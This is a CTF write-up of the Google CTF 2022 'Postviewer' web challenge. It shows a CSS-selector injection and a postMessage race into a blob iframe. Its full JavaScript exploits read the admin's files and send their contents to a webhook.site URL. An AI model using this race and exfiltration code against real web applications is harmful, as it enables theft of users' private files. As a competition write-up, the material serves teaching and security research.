---
title: justCatTheFish - Google CTF 2022 - Postviewer writeup.
published: true
author: haqpl
---

## Challenge description

Postviewer was one of the web category tasks in Google CTF 2022. The author of the task - terjanq - prepared for us a client-side application whose purpose was to host files. This was realized by storing them in IndexedDB - a builtin browser API for storing data. From the task's description, we know that our objective is to steal the admin's files. 

![](https://i.imgur.com/XbXbbN7.png)


## First vuln - Getting to the note without knowing its ID

First we can try to add a sample file and see how the application handles them.

![](https://i.imgur.com/PLpXXqi.png)

As we can see, the ID of the file is passed in `location.href`, inspecting the code responsible for viewing the file spills us the first vulnerability:

![](https://i.imgur.com/codvILh.png)

The application executes `document.querySelector` on untrusted user input which gives us two things. Firstly, we could leak the IDs of the admin's files - including ID of the file containing the flag and secondly we could refer to the files without knowing their ID!

Let's consider the following CSS selector:

`#xd,a.list-group-item:nth-child(1)`

![](https://i.imgur.com/zibHJPR.png)

With this we do not need to know the ID of the flag file and can thus open it in the admin's context.

## Second vuln - Leaking the file contents

Now that we have a way of accessing the file we have to figure out how to leak its contents so let's take a look at how viewing functionality is implemented.

```js
async function previewFile(file){
    const previewIframeDiv = document.querySelector('#previewIframeDiv');
    previewIframeDiv.innerText = '';
    await sleep(100);
    previewIframe(previewIframeDiv, file, file.type || 'application/octet-stream');
}
```

`previewIframe` function creates `iframe` which points to a blob with `SHIM`, which registers an `onmessage` handler and then receives the `body` of the file for processing the display.

But what if we could post our own malicious postMessage, before the 34th line gets executed? Theoretically, the `SHIM` should then render our payload, let's verify if that's the case.

![](https://i.imgur.com/V90NDl8.png)

### PoC 1 - Rendering our own content
To test that we can use a relatively simple payload like this:

```html
<script>
essa = window.open("https://postviewer-web.2022.ctfcompetition.com/")

setTimeout(function() {
    essa.location = "https://postviewer-web.2022.ctfcompetition.com/#a,a.list-group-item"

    function race() {
        if(essa.frames.length > 0) {
            essa.frames[0].postMessage({ body: `
            <script>
            console.log("WIN", Date.now(), window.origin, window.location.href)
            window.stop()
            <\/script>
            
            <body>
            </body>`, mimeType: "text/html" }, "*")
            
        }
    }
    onmessage = function a(data) {
        if(data.data == "blob loaded") {
            clearInterval(gg)
            alert("WIN")
        }
    }
    var gg = setInterval(race, 25);
    
}, 1000)
</script>
```

The code above does the following:

1. Opens the postviewer application
2. After 1000ms change the location of the opened window to the first file on the list, leveraging the first vulnerability.
3. Register onmessage handler so that we can know if we have won the race
4. Start the race, spamming postMessages every 25ms to the application in the hope that we send our payload before the application tries to handle legitimate file contents (line 34).

After executing the code a few times we were indeed able to win the race! 

**Notice**: it's better to switch focus back to the POC right after the window opens, we could increase the 1000ms timeout to have more time before the attack starts.

![](https://i.imgur.com/BuKOxKL.png)

Unfortunately, the XSS we achieved has the context of the blob, not the top domain, which means we cannot steal files easily. This sets us back for a while but eventually, we asked ourselves a question: What if we could register our own malicious `onmessage` inside the `SHIM`, which mimics the original one and wait for the application to execute line 34 and send us the file contents? It turned out it's not so easy as `onmessage` handler registration takes too much time! We did the math and there was no way to be on time. But if we could slow down the time somehow, then theoretically it could work :smiley:

Unfortunately, we didn't come up with an effective way to slow down the application before we registered the message handler, but nothing is lost, we just tried to reopen the file in the loop by changing the window location again after we set up the handler. That in effect created many `iframes` and one of them had our malicious handler, it was enough that another legit one sends the file contents, which was the flag.

### PoC 2 - Leaking the flag

We need a little trick to satisfy the aforementioned requirement with the focus on the browser tab with our modified exploit:

```html
<script>
    a = window.open("solve.html")
    window.location = "https://postviewer-web.2022.ctfcompetition.com/" 
</script>
```

```html
<script>
    essa = window.opener
    setTimeout(function() {
        for (var i = 0; i < 100; i++) {
            essa.location = `https://postviewer-web.2022.ctfcompetition.com/#a${i},a.list-group-item`
        }
        function race() {
            if(essa.frames.length > 0) {
                essa.frames[0].postMessage({ body: `
                <script>
                window.onmessage = function(data) {
                    if(data.data.body  instanceof File) {
                        read = new FileReader();
                        read.readAsBinaryString(data.data.body)
                        read.onloadend = function(){
                            fetch("https://webhook.site/13471179-aed7-455f-9712-2500d28b85fa?contents=" + encodeURIComponent(read.result));
                        }
                    }
                }
                <\/script>
                <body>
                </body>`, mimeType: "text/html" }, "*")
                
            }
        }
        onmessage = function a(data) {
            if(data.data == "blob loaded") {
                clearInterval(gg)
                alert("WIN")
            }
        }
        var gg = setInterval(race, 50);     
    }, 1000)
    </script>
```

After pointing bot to the `setup.html` file containing our payload, we received the contents of the first file which to our disappointment was not the flag:

```
Congratulations on fetching admin's file! 
The flag needs to be deciphered with a password that has been split into three random files. 
Because the password is random with each run, you will have to collect all three files. 
When you do so, just visit: https://postviewer-web.2022.ctfcompetition.com/dec1pher 
File info: 
Cipher: JBeymjg4WwbRA2BWbIZTdZPN+mKk5gzl8ZffggnDwmv7YnJU8gJIt7b219StD6SUyRreWTnkbWJ07OX1tXY+ 
Password part [1/3]: 1l1ky401ocpl6516lmkr4 
The challenge is easily solvable under 5 seconds, but as a token of appreciation I set up a secret endpoint for you that have a limit of 20 seconds: https://postviewer-web.2022.ctfcompetition.com/bot?s=s333cret_b00t_3ndop1nt
```

terjanq came up with an interesting way to avoid people accidentally leaking the flag, we need to be able to leak three files one after another to be able to decrypt the real flag. Luckily for us, it only means that we need to execute our exploit three times, every time adjusting `nth-child(x)` especially since we now have 15 more seconds to finish the exploit.


## Final exploit code

```html
<script>
    sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
    essa = window.opener
    setTimeout(async function() {
        async function a(child) {
            console.log(child)
            essa.location.replace(`https://postviewer-web.2022.ctfcompetition.com/`)
            await sleep(500);
            for (var i = 0; i < 50; i++) {
                essa.location = `https://postviewer-web.2022.ctfcompetition.com/#a${i},a.list-group-item:nth-child(${child})`
            }
            function race() {
                if(essa.frames.length > 0) {
                    essa.frames[0].postMessage({ body: `
                    <script>
                    console.log("essa", Date.now())
                    window.onmessage = function(data) {
                        if(data.data.body  instanceof File) {
                            read = new FileReader();
                            read.readAsBinaryString(data.data.body)
                            read.onloadend = function(){
                                fetch("https://webhook.site/13471179-aed7-455f-9712-2500d28b85fa?content=" + encodeURIComponent(read.result));
                            }
                        }
                    }
                    <\/script>
                    <body>
                    </body>`, mimeType: "text/html" }, "*")
                    
                }
            }
            var gg = setInterval(race, 50);
            await sleep(5000);
            clearInterval(gg)
        }
        
        await a(1);
        await a(2);
        await a(3);
        
    }, 1000)
    </script>
```

Hurray! Executing the above exploit yields three parts of the password to decrypt the flag:

![](https://i.imgur.com/1GivU1F.png)

And with that we can now decrypt the real flag:

![](https://i.imgur.com/mdLospk.png)

`CTF{Pr0cess_isolat1on_foR_The_Win!}`

## credits

https://twitter.com/dr_brix & https://twitter.com/haqpl & https://twitter.com/justcatthefish
